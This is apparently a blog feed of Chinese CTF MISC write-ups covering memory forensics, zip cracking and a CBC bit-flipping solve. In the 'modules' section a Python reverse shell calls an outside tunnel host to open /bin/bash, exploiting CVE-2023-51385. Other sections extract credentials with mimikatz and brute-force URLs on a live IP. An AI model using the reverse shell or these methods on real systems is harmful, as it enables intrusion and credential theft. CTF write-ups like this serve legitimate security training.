beginctfisnice.func_readfile(&quot;my_first_beginctf_flag.txt&quot;)</span><br><span class="line">aaa = beginctfisnice.func_aes(aa,1)</span><br><span class="line">aaaa = beginctfisnice.func_special_base64(aaa,&quot;ZzYyXxAaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWw0123456789+/&quot;)</span><br><span class="line">aa = beginctfisnice.func_xor(a.decode(),&quot;PYThoN_For3N5IC$_i5_r3aL1Y_w0nDERfu1&quot;)</span><br><span class="line"></span><br><span class="line"># strings dumpv1.DMP | grep &quot;b&#x27;&quot;</span><br><span class="line">&gt;</span><br><span class="line">b&#x27;CsQ5vL6LTwtgKyW0bdZKhpN1S/OqiLwI++G1cPD5SfhA0EkXej7RIBk1z9/8mm7fjzE5+THCsGJPOJXRp7JQa18juUtswBQguYi4e2TAHIT=&#x27;</span><br><span class="line"></span><br><span class="line"># aeskeyfind dumpv1.DMP</span><br><span class="line">&gt;</span><br><span class="line">0eeac3e32b31444ab244a415b275b7f7</span><br></pre></td></tr></table></figure><p>对照 a 的加密流程进行解密<br><img src="/2024-BeginCTF-MISC-WP/1706728942050-90d56d08-6c52-4d95-9e0c-0570d35747e9.png" alt="PPQSL{OUQ28VANC@1@Y54CK.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">begin&#123;DId_y0U_L1k3_thIs_PyThON_F0R3n$1cs_aND_U5IN6_FInD4eS_T0_got_ThE_Key!&#125;</span><br></pre></td></tr></table></figure><h2 id="dump-dump-dump-2-0"><a href="#dump-dump-dump-2-0" class="headerlink" title="dump dump dump 2.0"></a>dump dump dump 2.0</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># strings dumpv2.DMP | grep &#x27;a = &#x27;</span><br><span class="line">&gt;</span><br><span class="line">a = beginctfisnice.func_readfile(&quot;my_second_beginctf_flag.txt&quot;)</span><br><span class="line">aaa = beginctfisnice.func_aes(aa)</span><br><span class="line">aa = beginctfisnice.func_xor(a.decode(),&quot;How_@8OuT_53CONd_PARt_0F_FoR3n5ICS!&quot;)</span><br><span class="line">aaaa = beginctfisnice.func_special_base64(aaa,&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;)</span><br><span class="line">aaaa = beginctfisnice.func_special_base64(aaa,&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;)</span><br><span class="line"></span><br><span class="line"># strings dumpv2.DMP | grep &quot;b&#x27;&quot;</span><br><span class="line">&gt;</span><br><span class="line">b&#x27;NhCMHiPvC2WWk3/OxNU10e8yrNm/mR8t3+9PsE9ALnT2xsGFg/dKVUwoU3Egv0lR&#x27;</span><br><span class="line"></span><br><span class="line"># aeskeyfind dumpv2.DMP</span><br><span class="line">&gt;</span><br><span class="line">c4daabe0a20a9e26ef2ba0833b2cc2e7</span><br></pre></td></tr></table></figure><p>先以 00 填充 iv ，结合 a 的加密流程进行解密<br><img src="/2024-BeginCTF-MISC-WP/1706729249531-7f7733dd-9fdc-4370-b851-7257d8996c69.png" alt="image.png"><br>手动修改 iv<br><img src="/2024-BeginCTF-MISC-WP/1706729319934-bc6d1de8-2b92-4031-9b26-f48d13994055.png" alt="image.png"><br>当凑齐 begin 头时 iv 为 a2b3877998 ，在010中以16进制搜索该字节<br><img src="https://cdn.nlark.com/yuque/0/2024/png/35229002/1706729374494-141e2136-6240-46c1-ad62-418e67dcbb96.png#averageHue=%23363430&clientId=u9c82abca-5dfb-4&from=paste&height=550&id=uc30b1e66&originHeight=550&originWidth=1329&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69363&status=done&style=none&taskId=u4eff8eb2-596a-45ee-b541-75a5882b6fe&title=&width=1329" alt="image.png"><br>得到 iv 为 a2b38779985a25bfec905a67809790ec<br>补全 iv 进行解密<br><img src="/2024-BeginCTF-MISC-WP/1706729478946-64c85c94-9a9e-44a7-8df6-08526a32940e.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">begin&#123;tiME_fOr_DUMpV2_AND_Us1ng_Cbc&#125;</span><br></pre></td></tr></table></figure><h2 id="dump-dump-dump-2-5"><a href="#dump-dump-dump-2-5" class="headerlink" title="dump dump dump 2.5"></a>dump dump dump 2.5</h2><p>还是上题的思路，但是iv被出题人以00填充了，需要进行 CBC 字节翻转攻击</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uBLJX+/zmxZn6oKVymM7t4HbVEiBvv7+kFKf/DZNHkQxF1wC0L1f4DmP5O5GO/H2HfrI+W3SdtSGJKSjVM+qO50SSxpVIJ4YTrE2r/V7bj0=</span></span><br><span class="line"><span class="comment"># key：0e805c9b86ff8c94ca68a3a5ad8f2836</span></span><br><span class="line"><span class="comment"># iv：3c473e98356000000000000000000000</span></span><br><span class="line"><span class="comment"># XOR：T1me_For_5ecOnD_P4R7_of_thE$E_FOREN$ICs_hoPe_no_fOr3NSC15</span></span><br></pre></td></tr></table></figure><h2 id="饥渴C猫-is-hacker"><a href="#饥渴C猫-is-hacker" class="headerlink" title="饥渴C猫 is hacker!"></a>饥渴C猫 is hacker!</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># https://github.com/JPaulMora/Duck-Decoder</span><br><span class="line">python2 DuckDecoder.py decode payload.bin</span><br><span class="line"></span><br><span class="line">begin&#123;this_file_is_called_inject_bin_hope_you_like_it!&#125;</span><br></pre></td></tr></table></figure><h2 id="学取证咯-cmd"><a href="#学取证咯-cmd" class="headerlink" title="学取证咯 - cmd"></a>学取证咯 - cmd</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f 学取证咯.raw imageinfo</span><br><span class="line">volatility.exe -f 学取证咯.raw --profile=Win7SP1x64 cmdscan</span><br><span class="line"></span><br><span class="line">flag&#123;Cmd_1in3_109_i5_imp0rt@nt&#125;</span><br></pre></td></tr></table></figure><h2 id="学取证咯-还记得ie吗？"><a href="#学取证咯-还记得ie吗？" class="headerlink" title="学取证咯 - 还记得ie吗？"></a>学取证咯 - 还记得ie吗？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">volatility.exe -f 学取证咯.raw --profile=Win7SP1x64 iehistory</span><br><span class="line"></span><br><span class="line">flag%7BY0v_c@n_g3t_th3_i3hi5t0ry%7D</span><br><span class="line">flag&#123;Y0v_c@n_g3t_th3_i3hi5t0ry&#125;</span><br></pre></td></tr></table></figure><h2 id="学取证咯-计算机的姓名？"><a href="#学取证咯-计算机的姓名？" class="headerlink" title="学取证咯 - 计算机的姓名？"></a>学取证咯 - 计算机的姓名？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f 学取证咯.raw --profile=Win7SP1x64 mimikatz</span><br><span class="line"></span><br><span class="line">VVHATI5Y0VRNAM3</span><br></pre></td></tr></table></figure><h2 id="学取证咯-想登入我的计算机吗"><a href="#学取证咯-想登入我的计算机吗" class="headerlink" title="学取证咯 - 想登入我的计算机吗"></a>学取证咯 - 想登入我的计算机吗</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f 学取证咯.raw --profile=Win7SP1x64 mimikatz</span><br><span class="line"></span><br><span class="line">flag&#123;Mimikatz_0r_j0hn&#125;</span><br></pre></td></tr></table></figure><h2 id="学取证咯-机密文件"><a href="#学取证咯-机密文件" class="headerlink" title="学取证咯 - 机密文件"></a>学取证咯 - 机密文件</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f 学取证咯.raw --profile=Win7SP1x64 filescan | grep &#x27;机密&#x27;</span><br><span class="line">0x000000001e742dd0 3 1 R--rw- \Device\HarddiskVolume1\Users\yuren\Desktop\机密文件.docx</span><br><span class="line"></span><br><span class="line">vol.py -f 学取证咯.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001e742dd0 -D ./</span><br><span class="line"></span><br><span class="line">flag&#123;Y0v_c@n_d0vvn_th3_fi13&#125;</span><br></pre></td></tr></table></figure><h2 id="学取证咯-真的是取证吗？"><a href="#学取证咯-真的是取证吗？" class="headerlink" title="学取证咯 - 真的是取证吗？"></a>学取证咯 - 真的是取证吗？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f 学取证咯.raw --profile=Win7SP1x64 filescan | grep &#x27;flag&#x27;</span><br><span class="line">0x000000001e9d8070 4 0 R--r-d \Device\HarddiskVolume1\Users\yuren\Desktop\flag_is_here.exe</span><br><span class="line"></span><br><span class="line">vol.py -f 学取证咯.raw --profile=Win7SP1x64 dumpfiles -Q 0x000000001e9d8070 -D ./</span><br></pre></td></tr></table></figure><p>脱入 IDA 32 ，选择字串 ‘FLAG’ ，Ctrl + X 定位，F5反编译<br><img src="/2024-BeginCTF-MISC-WP/1707043864575-23b55cfc-4f00-46e0-9f81-dd4af7f3a801.png" alt="image.png"><br><img src="/2024-BeginCTF-MISC-WP/1707043973861-dff55d9b-720e-4d49-95cf-fe22c9ef3dec.png" alt="image.png"><br>根据数据 逆向出key<br><img src="/2024-BeginCTF-MISC-WP/1707044098349-f145b4e1-5b52-42a3-b091-d362dea67874.png" alt="image.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data = [<span class="number">31</span>, <span class="number">21</span>, <span class="number">24</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">73</span>, <span class="number">15</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">57</span>, <span class="number">15</span>, <span class="number">74</span>, <span class="number">38</span>, <span class="number">21</span>, <span class="number">74</span>, <span class="number">57</span>, <span class="number">11</span>, <span class="number">23</span>, <span class="number">74</span>, <span class="number">29</span>, <span class="number">38</span>, <span class="number">17</span>, <span class="number">73</span>, <span class="number">15</span>, <span class="number">15</span>, <span class="number">38</span>, <span class="number">13</span>, <span class="number">73</span>, <span class="number">38</span>, <span class="number">31</span>, <span class="number">73</span>, <span class="number">11</span>, <span class="number">74</span>, <span class="number">23</span>, <span class="number">76</span>, <span class="number">16</span>, <span class="number">26</span>, <span class="number">76</span>, <span class="number">4</span>, ]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xor</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">chr</span>(num ^ <span class="number">0x79</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(xor, data)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;Y0v_h@v3_l3@rn3d_h0vv_t0_f0r3n5ic5&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 L3HCTF MISC WP</title>
      <link href="/2024-L3HCTF-MISC-WP/"/>
      <url>/2024-L3HCTF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="chekin"><a href="#chekin" class="headerlink" title="chekin"></a>chekin</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">L3HCTF&#123;w3LC0m3_70_L3Hc7F&#125;</span><br></pre></td></tr></table></figure><h1 id="RAWaterMark"><a href="#RAWaterMark" class="headerlink" title="RAWaterMark"></a>RAWaterMark</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rawpy</span><br><span class="line"></span><br><span class="line">raw = rawpy.imread(<span class="string">r&quot;image.ARW&quot;</span>)</span><br><span class="line">data = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, <span class="built_in">list</span>(raw.raw_image_visible[<span class="number">0</span>] % <span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line">out = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">8</span>):</span><br><span class="line">    out += <span class="built_in">int</span>(data[i:i + <span class="number">8</span>], <span class="number">2</span>).to_bytes(<span class="number">1</span>, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(out)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024 春秋杯冬季赛 MISC WP</title>
      <link href="/2024-%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-MISC-WP/"/>
      <url>/2024-%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><hr><h3 id="谁偷吃了我的外卖"><a href="#谁偷吃了我的外卖" class="headerlink" title="谁偷吃了我的外卖"></a>谁偷吃了我的外卖</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 分离出zip</span><br><span class="line">binwalk -e &#x27;/root/Desktop/小凯.jpg&#x27; --run-as=root </span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 复原zip</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">zipf = zipfile.ZipFile(<span class="string">r&#x27;C:\Users\HK\Desktop\外卖箱.zip&#x27;</span>)</span><br><span class="line">file_dict = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 提取base64</span></span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> zipf.infolist():</span><br><span class="line">    file_name = item.filename.encode(<span class="string">&#x27;cp437&#x27;</span>).decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;用户&#x27;</span> <span class="keyword">in</span> file_name:</span><br><span class="line">        <span class="built_in">id</span>, base = file_name[<span class="number">6</span>:].split(<span class="string">&#x27;_&#x27;</span>)</span><br><span class="line">        file_dict[<span class="built_in">int</span>(<span class="built_in">id</span>)] = base[:-<span class="number">3</span>]</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">id</span> <span class="keyword">in</span> <span class="built_in">sorted</span>(file_dict.keys()):</span><br><span class="line">    out += file_dict[<span class="built_in">id</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 补齐还原base64</span></span><br><span class="line">out = <span class="string">&#x27;UEsD&#x27;</span> + out.replace(<span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;/&#x27;</span>).strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">f.write(base64.b64decode(out))</span><br></pre></td></tr></table></figure><p>md文档获取flag1<br>根据 钥匙.png bandzip压缩方式 压缩出明文zip</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># bkcrack明文爆破</span><br><span class="line">bkcrack -C &#x27;./外卖箱.zip&#x27; -c &#x27;外卖箱/flag/钥匙.png&#x27; -P &#x27;./钥匙.zip&#x27; -p &#x27;钥匙.png&#x27;</span><br><span class="line">&gt;&gt;&gt; 48ff002a 56e00484 380c5c49</span><br><span class="line"></span><br><span class="line"># 重置密码</span><br><span class="line">bkcrack -C &#x27;./外卖箱.zip&#x27; -k 48ff002a 56e00484 380c5c49 -U &#x27;./out.zip&#x27; 123456</span><br></pre></td></tr></table></figure><p>使用 123456 解压出 txt.galf,将内容逆序获得 flag2,拼接得到flag</p><h3 id="modules"><a href="#modules" class="headerlink" title="modules"></a>modules</h3><p>CVE编号：CVE-2023-51385<br>gitee 构建项目，同时建立子模块，由于不能插入 ‘&#x2F;‘ 字符，反弹python shell </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line"><span class="comment"># 花生壳内网穿透工具 86s2d65770.zicp.fun:38380</span></span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;86s2d65770.zicp.fun&quot;</span>,<span class="number">38380</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-i&quot;</span>]);</span><br></pre></td></tr></table></figure><p>部署仓库进行命令执行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取flag</span></span><br><span class="line">cd ../../ &amp;&amp; cat flag</span><br></pre></td></tr></table></figure><h1 id="可信计算"><a href="#可信计算" class="headerlink" title="可信计算"></a>可信计算</h1><hr><h3 id="可信计算1-可信计算2"><a href="#可信计算1-可信计算2" class="headerlink" title="可信计算1 &amp;&amp; 可信计算2"></a>可信计算1 &amp;&amp; 可信计算2</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">非预期</span></span><br><span class="line">find / -name &quot;*flag*&quot;</span><br><span class="line">cat /root/cube-shell/instance/flag_server/flag.list</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 赣网杯 MISC WP</title>
      <link href="/2023-%E8%B5%A3%E7%BD%91%E6%9D%AF-MISC-WP/"/>
      <url>/2023-%E8%B5%A3%E7%BD%91%E6%9D%AF-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="misc1"><a href="#misc1" class="headerlink" title="misc1"></a>misc1</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 文件末尾 zip 分离</span><br><span class="line"># happy.rar -&gt; 提取happy.zip -&gt; 删除文件末尾 -&gt; winrar压缩</span><br><span class="line"></span><br><span class="line"># BKCRACK爆破 &#x27;/root/Desktop/bkcrack-1.5.0-Linux/bkcrack&#x27; -C &#x27;/root/Desktop/flag.zip&#x27; -c happy.png -P &#x27;/root/Desktop/happy.zip&#x27; -p happy.png</span><br><span class="line"></span><br><span class="line"># BKCRACK修改密码</span><br><span class="line">&#x27;/root/Desktop/bkcrack-1.5.0-Linux/bkcrack&#x27; -C &#x27;/root/Desktop/flag.zip&#x27; -k 72faa619 e1f67251 736a3b2b -U &#x27;/root/Desktop/out.zip&#x27; 123456</span><br><span class="line"></span><br><span class="line"># flag.txt 中链接掩码爆破</span><br><span class="line">import string</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line">wordlist = string.digits + string.ascii_letters</span><br><span class="line">for char1 in wordlist:</span><br><span class="line">    for char2 in wordlist:</span><br><span class="line">        url = f&quot;http://124.221.18.25/f14gish&#123;char1&#125;re&#123;char2&#125;y.txt&quot;</span><br><span class="line">        response = requests.post(url).text</span><br><span class="line">        if len(response) != 169:</span><br><span class="line">            print(url)</span><br><span class="line">            print(response)</span><br><span class="line">            </span><br><span class="line"># url:http://124.221.18.25/f14gish3reoy.txt</span><br></pre></td></tr></table></figure><h1 id="misc3"><a href="#misc3" class="headerlink" title="misc3"></a>misc3</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 导出data数据</span><br><span class="line">F:\WEB\Wireshark\tshark.exe -r C:\Users\HK\Desktop\attachment.pcap -T fields -e s7comm.resp.data -Y &#x27;frame.len == 93&#x27; &gt; C:\Users\HK\Desktop\out.txt</span><br><span class="line"></span><br><span class="line"># 转换成原始数据</span><br><span class="line">out = &#x27;&#x27;</span><br><span class="line">lines  = open(r&quot;C:\Users\HK\Desktop\out.txt&quot;,encoding=&#x27;utf-8&#x27;).readlines()</span><br><span class="line">for line in lines:</span><br><span class="line">    line = line.strip()</span><br><span class="line">    out += line</span><br><span class="line"></span><br><span class="line">print(out)</span><br><span class="line"></span><br><span class="line"># strings data</span><br><span class="line">GFVWUV3WOFIUG3DPJB4DQ6TVO5ZUW3ZVOBKFCP3QO5SD2MJSGM2A====</span><br><span class="line">1kjWvqQCloHx8zuwsKo5pTQ?pwd=1234</span><br><span class="line"></span><br><span class="line"># 恢复成百度网盘链接</span><br><span class="line">https://pan.baidu.com/s/1kjWvqQCloHx8zuwsKo5pTQ?pwd=1234</span><br><span class="line"></span><br><span class="line"># reverse &amp;&amp; from base64 得到压缩包</span><br><span class="line"></span><br><span class="line"># 压缩包内 \_MACOSX\secret\._flag 包含了图片的源项目地址 https://piellardj.github.io/，使用项目中的解密器 https://piellardj.github.io/stereogram-solver/ 即可得到 flag.png 原图</span><br></pre></td></tr></table></figure><p> <img src="/2023-%E8%B5%A3%E7%BD%91%E6%9D%AF-MISC-WP/1702702472654-f9a42fe2-4a2a-4805-bc57-51e173c851b1.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MISC </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 古剑山 MISC WP</title>
      <link href="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/"/>
      <url>/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="i-have-the-flag"><a href="#i-have-the-flag" class="headerlink" title="i have the flag"></a>i have the flag</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">ck</span>(<span class="params">s</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        ic</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">var</span> a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>];</span><br><span class="line">    <span class="keyword">if</span> (s.<span class="property">length</span> == a.<span class="property">length</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; s.<span class="property">length</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (a[i] - s.<span class="title function_">charCodeAt</span>(i) != <span class="number">3</span>)</span><br><span class="line">                <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ic = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ic = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 题目js代码，只要条件为真即可</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> num-<span class="number">3</span></span><br><span class="line">a = [<span class="number">118</span>, <span class="number">108</span>, <span class="number">112</span>, <span class="number">115</span>, <span class="number">111</span>, <span class="number">104</span>, <span class="number">104</span>, <span class="number">103</span>, <span class="number">120</span>, <span class="number">52</span>, <span class="number">53</span>, <span class="number">54</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">chr</span>,<span class="built_in">list</span>(<span class="built_in">map</span>(add,a))))))</span><br><span class="line"></span><br><span class="line"><span class="comment"># simpleedu123</span></span><br></pre></td></tr></table></figure><p><img src="/2023-%E5%8F%A4%E5%89%91%E5%B1%B1-MISC-WP/1702009855203-ca30cedc-d6cd-4159-ad48-6daf017e3300.png" alt="image.png"></p><h2 id="幸运饼干"><a href="#幸运饼干" class="headerlink" title="幸运饼干"></a>幸运饼干</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 